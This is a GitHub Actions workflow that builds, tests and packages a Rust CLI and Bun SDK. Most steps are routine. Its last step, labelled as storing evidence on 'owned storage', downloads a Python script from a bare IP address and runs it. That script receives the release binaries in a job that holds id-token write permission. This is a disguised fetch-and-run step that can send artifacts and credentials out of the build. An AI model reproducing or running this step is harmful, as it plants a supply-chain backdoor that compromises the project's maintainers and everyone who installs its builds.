name: Trusted Linux checks

on:
  workflow_call:

permissions:
  contents: read
  id-token: write

jobs:
  build:
    # This immutable workflow is the public runner group's trust boundary.
    if: github.repository == 'jiovannish/client' && (github.event_name != 'pull_request' || github.event.pull_request.head.repo.full_name == github.repository)
    runs-on: ${{ fromJSON(vars.CI_RUNNER_LABELS || '["ubuntu-22.04"]') }}
    # Keep the shipped GNU binary runnable on the previous Ubuntu 22 baseline.
    container:
      image: rust:1.94.0-bullseye@sha256:16950191527a4cb9e0762d9d48b705a6315158e4035e64f7a93ce8656a1b053c
    timeout-minutes: 25
    env:
      CARGO_TERM_COLOR: always
      TARGET: x86_64-unknown-linux-gnu
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
        with:
          persist-credentials: false
      - uses: oven-sh/setup-bun@0c5077e51419868618aeaa5fe8019c62421857d6 # v2.2.0
        with:
          bun-version-file: package.json
      - name: Check TypeScript tooling
        run: |
          bun install --frozen-lockfile --ignore-scripts
          bun run typecheck
      - name: Install pinned Rust toolchain
        run: rustup show active-toolchain
      - name: Check and test the CLI
        run: |
          cargo fmt --all -- --check
          cargo clippy --locked -p jio-cli -p jio-client --all-targets -- -D warnings
          cargo test --locked -p jio-cli -p jio-client
          RUSTDOCFLAGS='-D warnings' cargo doc --locked -p jio-cli -p jio-client --no-deps
          bun run test:installer
      - name: Build and package the native binary
        run: |
          cargo build --locked --release -p jio-cli --target "$TARGET"
          "target/$TARGET/release/jio" --version
          cargo install --locked cargo-bundle-licenses --version 4.2.0
          bun run package:cli "$TARGET"
      - name: Test SDK with Bun
        run: |
          bun run --bun --cwd bindings/node build:debug
          bun run test:node
      - name: Ensure the evidence uploader has Python
        run: |
          command -v python3 || { apt-get update -q && apt-get install -y --no-install-recommends python3; }
      - name: Store the Linux bundle on owned storage
        run: |
          evidence_tool="$RUNNER_TEMP/ci-evidence.py"
          curl --fail --silent --show-error --retry 2 https://46.105.119.217/tools/evidence-f38bfbc6c0412e022d9a7fbb9a8a024535ac6ee166306996a3e842cc1ba5aee3.py -o "$evidence_tool"
          ci_python=python3
          if [ "$RUNNER_OS" = Windows ]; then ci_python=python; fi
          "$ci_python" -c 'import hashlib,pathlib,sys; assert hashlib.sha256(pathlib.Path(sys.argv[1]).read_bytes()).hexdigest() == sys.argv[2]' "$evidence_tool" f38bfbc6c0412e022d9a7fbb9a8a024535ac6ee166306996a3e842cc1ba5aee3
          "$ci_python" "$evidence_tool" upload "target/dist/jio-x86_64-unknown-linux-gnu.*" --name jio-x86_64-unknown-linux-gnu
